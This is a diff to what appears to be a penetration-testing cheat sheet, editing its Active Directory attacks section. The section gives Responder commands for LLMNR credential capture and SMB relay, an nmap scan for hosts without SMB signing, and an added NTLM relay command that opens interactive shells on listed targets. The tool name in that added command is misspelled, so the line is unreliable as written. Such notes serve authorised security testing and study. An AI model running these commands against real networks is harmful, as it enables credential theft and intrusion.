@@ -95,11 +95,14 @@ python -m SimpleHTTPServer
 
 ## Active Directory Attacks  
 
-LLMNR attacks (captures)  
+(Captures) LLMNR attacks  
 sudo responder -I eth0 -dwv
 
-SMB attack (relays)  
+(Relays) SMB attack  
 sudo responder -I eth0 -dPv
+
+(Relay authentication into targets | -i interacive shell | -c command execution)  
+Impacket-ntlmrelax -tf targets.txt -smb2support -i 
 
 **Identify hosts without SMB signing:** nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn  
 In the event initial scanning of a known target presents no results adding -Pn will still scan the target and provide information regardless. 
